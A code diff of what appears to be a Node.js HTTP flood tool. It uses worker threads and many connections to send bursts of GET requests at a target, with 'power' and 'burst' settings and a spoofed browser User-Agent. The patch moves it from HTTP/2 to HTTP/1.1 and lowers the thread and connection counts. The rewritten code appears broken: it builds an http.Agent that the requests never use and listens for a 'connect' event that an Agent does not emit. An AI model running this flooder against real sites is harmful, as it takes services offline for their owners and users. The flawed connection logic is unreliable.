@@ -1,14 +1,14 @@
-const http2 = require('http2');
+const http = require('http');
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { cpus } = require('os');
 const readline = require('readline');
 const net = require('net');
 
-const THREADS = 32; // More threads for H1, higher burst capacity
-const INITIAL_CONNECTIONS = 30; // Even more initial connections to ramp power
-const POWER_MULTIPLIER = 3; // Increase power scale for H1-like performance
+const THREADS = 16;
+const INITIAL_CONNECTIONS = 20;
+const POWER_MULTIPLIER = 2;
 const WARMUP_TIME = 5000;
-const MAX_INFLIGHT = 3000; // Much higher inflight count for larger request handling
+const MAX_INFLIGHT = 2000;
 
 let totalRequests = 0;
 let successCount = 0;
@@ -94,8 +94,20 @@ if (isMainThread) {
 
         try {
             inflight.count++;
-            const req = client.request({ ':path': '/', ':method': 'GET' });
-            req.setNoDelay?.(true);
+            const req = http.request({
+                hostname: target,
+                port: 80, // Default HTTP port, change to 443 for HTTPS
+                path: '/',
+                method: 'GET',
+                headers: {
+                    'Connection': 'keep-alive',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                    'Accept': '*/*',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Upgrade-Insecure-Requests': '1'
+                }
+            });
+
             req.on('response', () => {
                 sendStat('ok');
                 inflight.count--;
@@ -104,6 +116,7 @@ if (isMainThread) {
                 sendStat('err');
                 inflight.count--;
             });
+
             req.end();
             sendStat('req');
         } catch {
@@ -117,12 +130,12 @@ if (isMainThread) {
     function createConnection() {
         let client;
         try {
-            client = http2.connect(target);
+            client = new http.Agent({ keepAlive: true }); // Reuse the same connection
             client.on('error', () => {});
             client.on('close', () => setTimeout(createConnection, 100));
             client.on('connect', () => {
                 const inflight = { count: 0 };
-                for (let i = 0; i < 200; i++) sendOne(client, inflight); // Increased request number for burst
+                for (let i = 0; i < 100; i++) sendOne(client, inflight);
             });
         } catch {
             setTimeout(createConnection, 250);
@@ -132,4 +145,4 @@ if (isMainThread) {
     for (let i = 0; i < connections; i++) {
         createConnection();
     }
-}
+            }
